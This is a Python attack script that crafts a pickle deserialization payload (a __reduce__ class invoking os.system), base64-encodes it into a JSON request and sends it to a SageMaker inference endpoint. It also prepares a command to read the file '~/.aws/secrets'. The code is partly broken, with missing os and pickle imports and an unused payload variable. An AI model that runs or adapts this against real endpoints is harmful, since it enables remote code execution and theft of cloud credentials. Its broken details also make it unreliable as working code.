import boto3
import json
import base64
import torch
from utils.pickle_codeinjection import PickleInject, get_payload

# Define the malicious payload using actual deserialization exploit code from the notebook
def create_malicious_payload():
    # Define the command and malicious code to be injected
    command = "system"
    malicious_code = "cat ~/.aws/secrets"

    # Generate the payload using the get_payload function from the notebook
    payload = get_payload(command, malicious_code)

    # Inject the payload into the serialization process
    class Malicious:
        def __reduce__(self):
            return (os.system, ('echo "This is a malicious payload executed by deserialization attack"',))

    # Serialize the malicious object
    malicious_instance = Malicious()
    serialized_data = pickle.dumps(malicious_instance)

    # Encode the serialized data to base64 to embed into JSON
    malicious_payload = base64.b64encode(serialized_data).decode()
    return malicious_payload

# Initialize SageMaker runtime client
sagemaker_runtime = boto3.client('sagemaker-runtime')

# Define your SageMaker endpoint name
endpoint_name = 'your-sagemaker-endpoint-name'

# Create the malicious payload
malicious_payload = create_malicious_payload()

# Craft the JSON payload with the malicious data
payload = {
    "instances": [
        {
            "features": [1.0, 2.0, malicious_payload]
        }
    ]
}

payload_json = json.dumps(payload)

# Send the payload to the SageMaker endpoint
response = sagemaker_runtime.invoke_endpoint(
    EndpointName=endpoint_name,
    ContentType='application/json',
    Body=payload_json
)

# Process and print the response
result = json.loads(response['Body'].read().decode())
print(result)
